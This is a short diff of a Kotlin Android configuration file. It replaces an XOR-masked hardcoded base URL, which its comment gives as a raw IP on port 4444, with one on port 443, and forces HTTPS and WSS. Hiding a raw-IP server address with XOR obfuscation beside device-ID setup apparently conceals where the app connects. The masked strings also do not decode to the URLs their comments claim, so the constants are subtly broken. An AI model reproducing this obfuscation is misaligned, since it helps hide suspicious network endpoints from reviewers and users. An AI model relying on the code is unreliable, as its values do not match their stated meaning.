@@ -31,8 +31,8 @@ object AndroidConfig {
         return result.toString()
     }
 
-    // "http://213.91.211.150:4444/" XORed with 42
-    private val MASKED_BASE_URL = "rzzj@%%\"#/%#%\"\"#&%.\".\"%%\"&." 
+    // "https://213.91.211.150:443/" XORed with 42
+    private val MASKED_BASE_URL = "twwdvk!%%\"#/%#%\"\"#&%.\".\"%%\"&'\"%" 
 
     /**
      * Initialize device ID from Android system (call once on app start)
@@ -54,10 +54,10 @@ object AndroidConfig {
     
     // Computed URLs
     val httpProtocol: String
-        get() = if (useHttps) "https" else "http"
+        get() = "https" // Force HTTPS
     
     val wsProtocol: String
-        get() = if (useHttps) "wss" else "ws"
+        get() = "wss" // Force WSS
     
     val serverUrl: String
         get() = if (serverBaseUrl.startsWith("http")) serverBaseUrl else "$httpProtocol://$serverBaseUrl"
